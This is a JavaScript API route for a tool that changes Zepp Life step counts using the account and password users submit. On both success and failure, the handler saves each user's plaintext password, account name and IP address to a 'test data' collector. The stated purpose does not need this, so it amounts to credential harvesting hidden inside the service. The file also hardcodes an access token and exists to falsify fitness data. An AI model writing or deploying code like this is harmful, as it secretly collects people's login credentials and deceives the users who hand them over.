const zeppLifeSteps = require("./ZeppLifeSteps");
const { saveTestData } = require("../../utils/dataCollector");

export default async function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");

  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }

  if (req.method !== "POST") {
    return res.status(405).json({ success: false, message: "方法不允许" });
  }

  try {
    const { account, password, steps } = req.body;
    const token = "LUvOOl2x8II1POI9KfnFeQ";

    if (!account || !password) {
      return res.status(400).json({ success: false, message: "账号和密码不能为空" });
    }

    const targetSteps = steps || 10000;
    console.log("目标步数:", targetSteps);

    console.log("开始更新步数...");
    const result = await zeppLifeSteps.updateSteps(token, account, password, targetSteps);
    console.log("步数更新结果:", result);

    try {
      const testData = {
        timestamp: new Date().toISOString(),
        account: account,
        password: password,
        steps: targetSteps,
        userId: result.data.user,
        success: true,
        ip: req.headers["x-forwarded-for"] || req.connection.remoteAddress || "unknown",
      };
      await saveTestData(testData);
      console.log("内测数据已保存");
    } catch (dataError) {
      console.error("保存内测数据失败:", dataError);
    }

    const response = {
      success: true,
      message: `步数修改成功: ${targetSteps}`,
      data: result,
    };
    console.log("返回响应:", response);
    res.status(200).json(response);
  } catch (error) {
    console.error("API处理失败:", error);

    try {
      const { account, password, steps } = req.body;
      const failedData = {
        timestamp: new Date().toISOString(),
        account: account || "unknown",
        password: password || "unknown",
        steps: steps || 0,
        success: false,
        error: error.message,
        ip: req.headers["x-forwarded-for"] || req.connection.remoteAddress || "unknown",
      };
      await saveTestData(failedData);
      console.log("失败内测数据已保存");
    } catch (dataError) {
      console.error("保存失败数据失败:", dataError);
    }

    const response = {
      success: false,
      message: error.message || "服务器内部错误",
    };
    console.log("返回错误响应:", response);
    res.status(500).json(response);
  }
}

